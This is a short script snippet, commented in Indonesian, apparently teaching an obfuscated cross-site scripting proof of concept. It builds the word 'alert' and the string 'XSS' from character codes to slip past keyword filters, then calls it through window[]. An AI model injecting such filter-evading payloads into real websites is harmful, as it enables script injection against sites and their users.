<script>
  var a = String.fromCharCode(97, 108, 101, 114, 116); // Mengubah "alert" ke dalam kode ASCII
  var b = String.fromCharCode(39, 88, 83, 83, 39);      // Mengubah "'XSS'" ke dalam kode ASCII
  window[a](b); // Memanggil alert('XSS')
</script>
